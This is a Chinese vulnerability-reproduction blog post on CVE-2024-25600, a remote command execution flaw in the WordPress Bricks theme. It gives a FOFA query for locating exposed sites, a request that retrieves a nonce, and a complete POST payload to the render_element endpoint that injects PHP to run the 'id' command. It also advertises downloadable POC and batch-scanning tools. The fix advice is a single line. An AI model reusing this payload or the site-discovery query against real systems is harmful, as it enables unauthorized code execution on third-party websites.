#  WordPress的Bricks主题存在远程命令执行漏洞CVE-2024-25600 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-23 22:52  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. WordPress简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
WordPress的Bricks主题  
## 2.漏洞描述  
  
WordPress的Bricks主题存在远程命令执行漏洞  
  
CVE编号:CVE-2024-25600  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
WordPress的Bricks主题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkDqhA9ibY2KsqoHsNCb9Tb8JCb4xt1UTMicW5wO2fCDImIicFBYQNpU7Ag/640?wx_fmt=jpeg&from=appmsg "null")  
  
WordPress的Bricks主题存在远程命令执行漏洞  
## 4.fofa查询语句  
  
body="/wp-content/themes/bricks/"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/wp-json/bricks/v1/render_element  
  
先访问一下目标，获取nonce 值  
```
GET / HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkMnuozbK9C7R7UctFnaybVuToibptf5EPJjKJPzEfnOlL4YjicJXSfqKw/640?wx_fmt=jpeg&from=appmsg "null")  
  
将nonce值拼接到漏洞数据包：  
```
POST /wp-json/bricks/v1/render_element HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 342

{
  "postId": "1",
  "nonce": "62112d803f",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
        "objectType": "post"
      }
    }
  }
}
```  
  
成功执行id命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkDg7triaYhgDcic3t5IS7cfU528dRSCmviat4icaxOSa1qklDCXe9ic5vpicw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现103 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkWrg8GhdvhWRKq3g30ibd5PED5NicAS3lhEdjEJqhYcZNIKbD02uicm6dg/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBk4Lhsggp4SQEXiauk6Mk3Q9YZv0TbMRdSbBlQXLsw0hkYNWyib1nU8L8Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkMs4VcwgicPr71icdCr5Y8Ffbnw2mYobo4362L2wN5jdwU8m9iaja6OBnA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkeNRiakf8OWfgjMDR9CyxicX7r6OH4pHpvDqicTOmsG2wh25W1EOJDCXcA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkCCd5Daz8R9DVDAUzI4ZqPSMiapkoTubUXzLgcDl0iatNVC3LyMcFgCsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3baPEicMDBF5Vx1icoxAnHsBkgUIGrxDu0TKBU7CicDZE1MRjjbj4qN9yeQ2icWqM1vEg1bibVJKRY4QvQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485320&idx=1&sn=2958c0f06328b36f2bab443697ae07ef&chksm=974b8a8fa03c039946f61ec067ca5399568bbf38d914733eb26c6844ed8518eba757345acd14&scene=21#wechat_redirect)  
  
  
[JeePlus低代码开发平台存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485320&idx=2&sn=7d251cedef0212dd6d6e21ee57ee8b7c&chksm=974b8a8fa03c0399d97e2aabc1d30175f30e499302bc738061287686c64b7171406f520aead9&scene=21#wechat_redirect)  
  
  
